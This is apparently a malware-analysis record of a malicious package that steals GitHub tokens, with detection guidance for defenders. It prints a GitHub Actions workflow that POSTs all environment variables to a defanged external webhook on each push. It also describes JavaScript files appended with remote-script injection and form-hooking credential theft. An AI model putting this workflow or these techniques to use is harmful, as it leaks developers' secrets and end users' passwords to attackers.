package_info.why_malicious: The package is suspected to exfiltrate GitHub personal access tokens (PATs) from the developer's environment, enabling attackers to compromise GitHub accounts and inject further malicious code into repositories. This leads to large-scale supply chain attacks, credential theft, and downstream code poisoning.

malicious_snippets.code_snippet:
name: hook
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Exfiltrate secrets
        run: |
          curl -X POST -d "$(env)" hxxps://send[.]wagateway.pro/webhook
malicious_snippets.code_behavior: On every push event in the CI/CD pipeline, the workflow executes a shell command that collects all environment variables (including GitHub secrets) and sends them via HTTP POST to a remote C2 server.

malice_analysis.why_suspicious: This workflow exfiltrates sensitive environment variables, including secrets, to an external server, which is a clear sign of malicious intent.
malice_analysis.violated_expectations: Normal GitHub Actions workflows do not send secrets or environment variables to untrusted external endpoints. Legitimate workflows may use secrets for deployment, but never exfiltrate them.
malice_analysis.similar_legitimate_use: A legitimate workflow might send build status notifications to a trusted internal endpoint, but never all secrets.

execution_context.trigger: runtime (browser execution of modified JS files)
execution_context.file_location: Appended to all *.js files in the repository

malicious_snippets.code_behavior: At runtime in the browser, the code injects a remote script from the attacker's server into the page, enabling further malicious actions such as credential theft.

malice_analysis.why_suspicious: Appending obfuscated script injection code to all JS files is a classic sign of a supply chain attack targeting end-users. The remote script is loaded from an untrusted domain.
malice_analysis.violated_expectations: Legitimate codebases do not silently inject remote scripts from unknown domains into all JS files. Such behavior is not part of normal development or deployment.
malice_analysis.similar_legitimate_use: Dynamic script injection may be used for analytics or A/B testing, but always from trusted, documented sources.
key_indicators: Remote script loaded from suspicious domain
Modification of all JS files in the project

malicious_snippets.code_behavior: When loaded in the browser, the remote script hooks into web form submissions, intercepts user credentials (such as passwords), and sends them to the attacker's exfiltration endpoint.

malice_analysis.why_suspicious: Intercepting password forms and exfiltrating credentials is a hallmark of web-based credential-stealing malware.
malice_analysis.violated_expectations: Legitimate scripts do not intercept and exfiltrate user credentials to untrusted domains.
malice_analysis.similar_legitimate_use: Form analytics or password strength meters may hook into forms, but never exfiltrate credentials.

behavioral_signatures: Addition of new GitHub Actions workflows that POST environment variables or secrets to external domains
Mass modification of *.js files to append obfuscated script injection code
Loading of remote scripts from untrusted or newly registered domains
Interception of web form submissions and exfiltration of credentials
file_indicators: All *.js files appended with script injection code
Obfuscated single-line script tags referencing external domains
detection_knowledge.how_to_detect: Monitor for new or modified GitHub Actions workflows that send environment variables or secrets to external endpoints. Scan repositories for mass modifications to JavaScript files, especially appended obfuscated script injection lines. Detect runtime loading of scripts from suspicious domains and monitor for network requests to known exfiltration endpoints. Use static and dynamic analysis to flag code that intercepts form submissions and sends data to untrusted servers.
